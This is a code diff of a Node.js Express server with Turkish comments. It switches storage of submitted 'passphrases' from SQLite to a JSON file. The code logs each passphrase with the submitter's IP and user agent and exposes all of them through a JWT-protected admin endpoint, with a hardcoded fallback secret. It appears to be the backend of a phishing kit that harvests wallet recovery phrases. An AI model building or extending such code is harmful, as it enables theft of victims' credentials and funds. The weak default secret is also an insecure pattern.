@@ -2,12 +2,38 @@ const express = require('express');
 const path = require('path');
 const jwt = require('jsonwebtoken');
 const dotenv = require('dotenv');
+const fs = require('fs').promises;
 const db = require('./database');
 
 dotenv.config();
 
 // JWT Secret key kontrolü ve tanımlaması
 const JWT_SECRET = process.env.JWT_SECRET || 'your_super_secret_key_123456789';
+const DATA_FILE = path.join(__dirname, 'data.json');
+
+// Veri kaydetme fonksiyonu
+const saveData = async (data) => {
+  try {
+    await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
+  } catch (error) {
+    console.error('Veri kaydetme hatası:', error);
+  }
+};
+
+// Veri okuma fonksiyonu
+const readData = async () => {
+  try {
+    const data = await fs.readFile(DATA_FILE, 'utf8');
+    return JSON.parse(data);
+  } catch (error) {
+    // Dosya yoksa boş array döndür
+    if (error.code === 'ENOENT') {
+      return { passphrases: [] };
+    }
+    console.error('Veri okuma hatası:', error);
+    return { passphrases: [] };
+  }
+};
 
 const app = express();
 
@@ -92,42 +118,47 @@ const authenticateToken = (req, res, next) => {
 };
 
 // Passphrase kaydetme endpoint'i
-app.post('/api/save-passphrase', (req, res) => {
+app.post('/api/save-passphrase', async (req, res) => {
   const { passphrase } = req.body;
   
   if (!passphrase) {
     return res.status(400).json({ success: false, error: 'Passphrase gerekli' });
   }
 
-  const uniqueId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
-  
-  db.run(
-    'INSERT INTO passphrases (passphrase, ip, userAgent, uniqueId) VALUES (?, ?, ?, ?)',
-    [passphrase, req.ip, req.get('User-Agent'), uniqueId],
-    function(err) {
-      if (err) {
-        console.error('Kaydetme hatası:', err);
-        return res.status(500).json({ success: false, error: 'Kayıt hatası' });
-      }
-      console.log('Passphrase kaydedildi:', this.lastID);
-      res.json({ success: true });
-    }
-  );
+  try {
+    const data = await readData();
+    const newPassphrase = {
+      id: Date.now(),
+      passphrase,
+      ip: req.ip,
+      userAgent: req.get('User-Agent'),
+      uniqueId: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
+      createdAt: new Date().toISOString()
+    };
+
+    data.passphrases.push(newPassphrase);
+    await saveData(data);
+
+    console.log('Passphrase kaydedildi:', newPassphrase.id);
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Kaydetme hatası:', error);
+    res.status(500).json({ success: false, error: 'Kayıt hatası' });
+  }
 });
 
 // Admin endpoint'i (korumalı)
-app.get('/api/admin/passphrases', authenticateToken, (req, res) => {
-  db.all(
-    'SELECT * FROM passphrases ORDER BY createdAt DESC',
-    [],
-    (err, rows) => {
-      if (err) {
-        console.error('Veri alma hatası:', err);
-        return res.status(500).json({ success: false, error: 'Veriler alınamadı' });
-      }
-      res.json({ success: true, data: rows });
-    }
-  );
+app.get('/api/admin/passphrases', authenticateToken, async (req, res) => {
+  try {
+    const data = await readData();
+    res.json({ 
+      success: true, 
+      data: data.passphrases.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
+    });
+  } catch (error) {
+    console.error('Veri alma hatası:', error);
+    res.status(500).json({ success: false, error: 'Veriler alınamadı' });
+  }
 });
 
 app.get('*', (req, res) => {
